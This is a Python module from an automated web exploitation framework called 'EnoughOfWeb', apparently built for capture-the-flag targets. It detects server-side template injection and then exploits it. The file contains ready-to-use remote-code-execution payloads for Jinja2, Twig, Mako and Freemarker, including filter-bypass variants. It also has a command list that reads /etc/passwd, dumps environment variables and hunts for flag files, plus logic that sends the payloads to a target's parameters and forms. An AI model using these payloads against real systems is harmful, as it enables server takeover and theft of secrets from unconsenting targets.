"""
EnoughOfWeb — Server-Side Template Injection (SSTI) Module
Engines: Jinja2, Twig, Mako, Freemarker, Velocity.
"""

import re
from typing import List, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from modules.base import BaseExploit, Finding, ExploitResult, Severity


# ---------------------------------------------------------------------------
# Detection payloads: each maps a template expression to its expected output
# ---------------------------------------------------------------------------

DETECT_PAYLOADS = [
    {"payload": "{{7*7}}", "expect": "49", "engines": ["jinja2", "twig", "nunjucks"]},
    {"payload": "{{7*'7'}}", "expect": "7777777", "engines": ["jinja2"]},
    {"payload": "{{7*'7'}}", "expect": "49", "engines": ["twig"]},
    {"payload": "${7*7}", "expect": "49", "engines": ["freemarker", "velocity", "mako"]},
    {"payload": "<%=7*7%>", "expect": "49", "engines": ["erb", "ejs"]},
    {"payload": "#{7*7}", "expect": "49", "engines": ["ruby", "java_el"]},
    {"payload": "${{7*7}}", "expect": "49", "engines": ["jinja2", "twig"]},
    {"payload": "{{config}}", "expect": "<Config", "engines": ["jinja2"]},
    {"payload": "{{self}}", "expect": "TemplateReference", "engines": ["jinja2"]},
    {"payload": "{{dump(app)}}", "expect": "Symfony", "engines": ["twig"]},
    {"payload": "<#assign x=7*7>${x}", "expect": "49", "engines": ["freemarker"]},
    {"payload": "#set($x=7*7)$x", "expect": "49", "engines": ["velocity"]},
    {"payload": "${7*7}", "expect": "49", "engines": ["mako"]},
    {"payload": "{{\"foo\".__class__}}", "expect": "class", "engines": ["jinja2"]},
    {"payload": "{{request}}", "expect": "Request", "engines": ["jinja2"]},
    {"payload": "{{_self.env}}", "expect": "Environment", "engines": ["twig"]},
    {"payload": "{{7+7}}", "expect": "14", "engines": ["jinja2", "twig", "nunjucks"]},
    {"payload": "{%print(7*7)%}", "expect": "49", "engines": ["jinja2"]},
    {"payload": "{{range(10)}}", "expect": "range", "engines": ["jinja2"]},
]

# ---------------------------------------------------------------------------
# RCE payloads per engine
# ---------------------------------------------------------------------------

JINJA2_RCE_PAYLOADS = [
    # Classic MRO chain
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    # os.popen chains
    "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[%d].__init__.__globals__['os'].popen('{cmd}').read()}}",
    # Lipsum trick
    "{{lipsum.__globals__['os'].popen('{cmd}').read()}}",
    # Cycler trick
    "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
    # Joiner trick
    "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
    # Namespace
    "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}",
    # request object
    "{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
    # Subprocess via subclass search
    "{{''.__class__.__bases__[0].__subclasses__()[%SUBPROCESS_IDX%](['{cmd}'],shell=True,stdout=-1).communicate()[0].decode()}}",
    # URL_for bypass
    "{{url_for.__globals__['os'].popen('{cmd}').read()}}",
    # get_flashed_messages bypass
    "{{get_flashed_messages.__globals__['os'].popen('{cmd}').read()}}",
]

JINJA2_FILTER_BYPASS_PAYLOADS = [
    # attr filter bypass
    "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('{cmd}')|attr('read')()}}",
    # String concat bypass for dot notation
    "{%set a='o'+'s'%}{{lipsum.__globals__[a].popen('{cmd}').read()}}",
    # Hex bypass
    "{{lipsum[\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"os\"].popen('{cmd}').read()}}",
    # Using dict merge to bypass filters
    "{%set d=dict(o=1,s=1)|join%}{{lipsum.__globals__[d].popen('{cmd}').read()}}",
]

TWIG_RCE_PAYLOADS = [
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('{cmd}')}}",
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{cmd}')}}",
    "{{['id']|filter('system')}}",
    "{{['{cmd}']|filter('system')}}",
    "{{['{cmd}']|map('system')|join}}",
    "{{{{\"/bin/sh -c '{cmd}'\" |raw}}}",
]

MAKO_RCE_PAYLOADS = [
    "${__import__('os').popen('{cmd}').read()}",
    "<%import os%>${os.popen('{cmd}').read()}",
    "<%import subprocess%>${subprocess.check_output('{cmd}',shell=True).decode()}",
]

FREEMARKER_RCE_PAYLOADS = [
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"{cmd}\")}",
    "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"{cmd}\")}",
    "${\"freemarker.template.utility.Execute\"?new()(\"{cmd}\")}",
]

# Commands to try for data extraction
RCE_COMMANDS = [
    "cat /flag*",
    "cat /flag.txt",
    "cat /home/*/flag*",
    "find / -name 'flag*' -type f 2>/dev/null | head -5",
    "cat /etc/passwd",
    "env",
    "ls -la /",
    "id",
    "cat /app/flag*",
    "cat /var/www/flag*",
    "cat /opt/flag*",
    "printenv FLAG",
    "echo $FLAG",
]


class SSTIExploit(BaseExploit):
    name = "ssti"
    description = "Server-Side Template Injection — Jinja2, Twig, Mako, Freemarker"
    priority = 2

    def detect(self, target_url: str, recon_data: dict) -> List[Finding]:
        findings: List[Finding] = []
        injection_points = self._gather_injection_points(target_url, recon_data)

        for point in injection_points:
            url = point["url"]
            param = point["param"]
            method = point["method"]
            base_data = point.get("base_data", {})

            finding = self._detect_ssti(url, param, method, base_data)
            if finding:
                findings.append(finding)

        return findings

    def exploit(self, finding: Finding) -> ExploitResult:
        engine = finding.extra.get("engine", "jinja2")
        try:
            if engine == "jinja2":
                return self._exploit_jinja2(finding)
            elif engine == "twig":
                return self._exploit_twig(finding)
            elif engine == "mako":
                return self._exploit_mako(finding)
            elif engine == "freemarker":
                return self._exploit_freemarker(finding)
            else:
                # Try all engines
                for fn in [self._exploit_jinja2, self._exploit_twig,
                           self._exploit_mako, self._exploit_freemarker]:
                    result = fn(finding)
                    if result.success:
                        return result
                return ExploitResult(success=False, error=f"No working exploit for engine: {engine}")
        except Exception as e:
            return ExploitResult(success=False, error=str(e))

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _gather_injection_points(self, target_url: str, recon_data: dict) -> list:
        points = []
        seen = set()

        for p in recon_data.get("parameters", []):
            key = (p.get("url", target_url), p["name"])
            if key in seen:
                continue
            seen.add(key)
            method = "GET" if p.get("location", "url") == "url" else "POST"
            points.append({
                "url": p.get("url", target_url),
                "param": p["name"],
                "method": method,
                "base_data": {},
            })

        for form in recon_data.get("forms", []):
            form_url = urljoin(target_url, form.get("action", ""))
            method = form.get("method", "POST").upper()
            inputs = form.get("inputs", {})
            for input_name in inputs:
                key = (form_url, input_name)
                if key in seen:
                    continue
                seen.add(key)
                points.append({
                    "url": form_url,
                    "param": input_name,
                    "method": method,
                    "base_data": dict(inputs),
                })

        if not points:
            for p in ["name", "template", "page", "content", "text", "input", "q", "search", "msg", "message"]:
                points.append({"url": target_url, "param": p, "method": "GET", "base_data": {}})

        return points

    def _send_payload(self, url, param, method, payload, base_data=None):
        data = dict(base_data) if base_data else {}
        
        def _do_send(p: str):
            try:
                if method == "GET":
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    qs[param] = [p]
                    new_query = urlencode(qs, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    return self._request("GET", test_url)
                else:
                    req_data = dict(data)
                    req_data[param] = p
                    return self._request("POST", url, data=req_data)
            except Exception:
                return None

        resp, used_payload, was_mutated = self._send_with_waf_retry(
            send_fn=_do_send,
            payload=payload,
            context="ssti",
            target_url=url
        )
        return resp

    def _detect_ssti(self, url, param, method, base_data) -> Optional[Finding]:
        detected_engines = set()
        first_payload = None
        first_evidence = None

        for entry in DETECT_PAYLOADS:
            payload = entry["payload"]
            expect = entry["expect"]
            engines = entry["engines"]

            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue

            if expect in resp.text:
                if first_payload is None:
                    first_payload = payload
                    first_evidence = f"'{expect}' found in response for payload '{payload}'"
                detected_engines.update(engines)

                # Check for flags while we're here
                flag = self._check_flag(resp.text)
                if flag:
                    first_evidence = f"Flag found during detection: {flag}"

        if detected_engines:
            engine = self._resolve_engine(detected_engines)
            return Finding(
                module=self.name,
                vuln_type="ssti",
                target_url=url,
                parameter=param,
                method=method,
                payload=first_payload,
                evidence=first_evidence,
                severity=Severity.CRITICAL,
                extra={
                    "engine": engine,
                    "detected_engines": list(detected_engines),
                    "base_data": base_data,
                },
            )
        return None

    def _resolve_engine(self, engines: set) -> str:
        """Narrow down to the most likely engine."""
        if "jinja2" in engines and "twig" in engines:
            # 7*'7' = '7777777' means Jinja2, = '49' means Twig
            # If both are present, the fingerprinting disambiguated it already
            return "jinja2"
        priority_order = ["jinja2", "twig", "mako", "freemarker", "velocity",
                          "nunjucks", "erb", "ejs"]
        for eng in priority_order:
            if eng in engines:
                return eng
        return list(engines)[0] if engines else "jinja2"

    def _exploit_jinja2(self, finding: Finding) -> ExploitResult:
        url, param, method = finding.target_url, finding.parameter, finding.method
        base_data = finding.extra.get("base_data", {})
        all_data = []

        # First try simple payloads that don't need cmd formatting
        simple_payloads = [p for p in JINJA2_RCE_PAYLOADS if "{cmd}" not in p and "%d" not in p and "%SUBPROCESS" not in p]
        for payload in simple_payloads:
            resp = self._send_payload(url, param, method, payload, base_data)
            if resp and ("root:" in resp.text or "bin/" in resp.text):
                flag = self._check_flag(resp.text)
                if flag:
                    return ExploitResult(success=True, flag=flag, payload_used=payload,
                                         technique="ssti-jinja2", raw_response=resp.text[:2000])

        # Try each cmd-parameterized payload with each command
        cmd_payloads = [p for p in JINJA2_RCE_PAYLOADS if "{cmd}" in p and "%d" not in p and "%SUBPROCESS" not in p]
        cmd_payloads += JINJA2_FILTER_BYPASS_PAYLOADS

        for cmd in RCE_COMMANDS:
            for payload_template in cmd_payloads:
                payload = payload_template.format(cmd=cmd)
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp is None:
                    continue

                flag = self._check_flag(resp.text)
                if flag:
                    return ExploitResult(
                        success=True, flag=flag, payload_used=payload,
                        technique="ssti-jinja2-rce",
                        raw_response=resp.text[:2000],
                    )

                # Check for meaningful output (not just the template echo)
                cleaned = self._extract_output(resp.text, payload)
                if cleaned and len(cleaned) > 5:
                    all_data.append(f"[{cmd}]: {cleaned[:500]}")

        if all_data:
            combined = "\n".join(all_data)
            flag = self._check_flag(combined)
            return ExploitResult(
                success=True, flag=flag, data_extracted=combined,
                technique="ssti-jinja2-rce",
            )

        return ExploitResult(success=False, error="Jinja2 RCE payloads failed")

    def _exploit_twig(self, finding: Finding) -> ExploitResult:
        url, param, method = finding.target_url, finding.parameter, finding.method
        base_data = finding.extra.get("base_data", {})

        for cmd in RCE_COMMANDS:
            for payload_template in TWIG_RCE_PAYLOADS:
                payload = payload_template.format(cmd=cmd)
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp is None:
                    continue
                flag = self._check_flag(resp.text)
                if flag:
                    return ExploitResult(
                        success=True, flag=flag, payload_used=payload,
                        technique="ssti-twig-rce", raw_response=resp.text[:2000],
                    )
                cleaned = self._extract_output(resp.text, payload)
                if cleaned and ("root:" in cleaned or "flag" in cleaned.lower()):
                    return ExploitResult(
                        success=True, data_extracted=cleaned,
                        payload_used=payload, technique="ssti-twig-rce",
                    )

        return ExploitResult(success=False, error="Twig RCE payloads failed")

    def _exploit_mako(self, finding: Finding) -> ExploitResult:
        url, param, method = finding.target_url, finding.parameter, finding.method
        base_data = finding.extra.get("base_data", {})

        for cmd in RCE_COMMANDS:
            for payload_template in MAKO_RCE_PAYLOADS:
                payload = payload_template.format(cmd=cmd)
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp is None:
                    continue
                flag = self._check_flag(resp.text)
                if flag:
                    return ExploitResult(
                        success=True, flag=flag, payload_used=payload,
                        technique="ssti-mako-rce", raw_response=resp.text[:2000],
                    )

        return ExploitResult(success=False, error="Mako RCE payloads failed")

    def _exploit_freemarker(self, finding: Finding) -> ExploitResult:
        url, param, method = finding.target_url, finding.parameter, finding.method
        base_data = finding.extra.get("base_data", {})

        for cmd in RCE_COMMANDS:
            for payload_template in FREEMARKER_RCE_PAYLOADS:
                payload = payload_template.format(cmd=cmd)
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp is None:
                    continue
                flag = self._check_flag(resp.text)
                if flag:
                    return ExploitResult(
                        success=True, flag=flag, payload_used=payload,
                        technique="ssti-freemarker-rce", raw_response=resp.text[:2000],
                    )

        return ExploitResult(success=False, error="Freemarker RCE payloads failed")

    def _extract_output(self, response_text: str, payload: str) -> Optional[str]:
        """Try to isolate the injected output from surrounding HTML."""
        # Remove HTML tags for cleaner analysis
        clean = re.sub(r"<[^>]+>", " ", response_text)
        clean = re.sub(r"\s+", " ", clean).strip()

        # Look for /etc/passwd content
        passwd_match = re.search(r"(root:.*?:/bin/\w+)", clean, re.DOTALL)
        if passwd_match:
            return passwd_match.group(0)

        # Look for flag patterns
        flag_match = re.search(r"((?:flag|FLAG|CTF|HTB|THM)\{[^}]+\})", clean)
        if flag_match:
            return flag_match.group(0)

        return None
